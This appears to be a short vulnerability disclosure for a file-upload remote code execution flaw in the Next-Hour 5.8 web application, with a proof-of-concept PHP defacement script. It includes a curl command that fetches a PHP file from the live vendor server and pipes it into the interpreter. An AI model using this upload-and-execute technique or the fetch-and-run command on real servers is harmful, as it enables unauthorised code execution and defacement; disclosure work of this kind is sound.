### [Next-Hour-5.8 - File Upload - RCE](https://mediacity.co.in/mediacity/)

### [software](https://nexthour.mediacity.co.in/)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mediacity.co.in/2024/Next-Hour-5.8/docs/Screenshot%202023-11-25%20101825.png)

## Description:
The class="input-file" id="image" parameter is vulnerable to File Upload and RCE attacks, it is not sanitized correctly.
The attacker can upload a virus directly on the server by using this web vulnerability, and then he can execute it, this can be 
the end of this server depending on the scenario! In this case, I just uploaded a php exploit that makes a hacked.html file =)
I am a Penetration Tester, not a stupid cracker! Thank you all!

STATUS: HIGH-CRITICAL Vulnerability

[+]Exploit execution:

```curl
 curl -s https://nexthour.mediacity.co.in/images/users/user_1704535102rapist.php | php
```
[+]Exploit example code:
```PHP
<?php
// @nu11secur1ty 2023
$myfile = fopen("hacked.html", "w") or die("Unable to open file!");
$txt = "<p>You are hacked</p>\n";
fwrite($myfile, $txt);
$txt = "<p>This is not good for you</p>\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
```


## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/media-city/Next-Hour-5.6)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/11/next-hour-56-file-upload-rce.html)

## Time spent:
00:35:00
